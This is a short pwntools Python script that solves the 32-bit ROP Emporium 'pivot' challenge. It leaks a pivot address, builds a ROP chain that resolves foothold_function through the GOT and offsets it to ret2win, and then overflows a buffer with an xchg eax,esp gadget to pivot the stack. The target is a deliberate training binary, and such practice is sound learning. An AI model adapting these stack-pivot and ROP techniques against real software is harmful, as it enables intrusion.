from pwn import *
target=process('./pivot32')
libpiv=ELF('./libpivot32.so')
elf=ELF('./pivot32')
libc=elf.libc

footholdfunc_plt=0x080485f0
footholdfunc_got=0x0804a024
moveaxEAX=0x080488c4
popeax=0x080488c0
addeaxebx=0x080488c7
offset=libpiv.symbols["ret2win"]-libpiv.symbols["foothold_function"]
popebx=0x08048571
calleax=0x080486a3

print(target.recvuntil("pivot: "))
pivot=int(target.recvline().strip("\n"),16)
print(hex(pivot))
print(target.recvuntil("there\n> "))

payload1=p32(footholdfunc_plt)
payload1+=p32(popeax)
payload1+=p32(footholdfunc_got)
payload1+=p32(moveaxEAX)
payload1+=p32(popebx)
payload1+=p32(offset)
payload1+=p32(addeaxebx)
payload1+=p32(calleax)

target.sendline(payload1)

print(target.recvuntil("smash\n> "))

xhgeaxesp=0x080488c2


payload2="A"*44
payload2+=p32(popeax)
payload2+=p32(pivot)
payload2+=p32(xhgeaxesp)

target.sendline(payload2)
target.interactive()


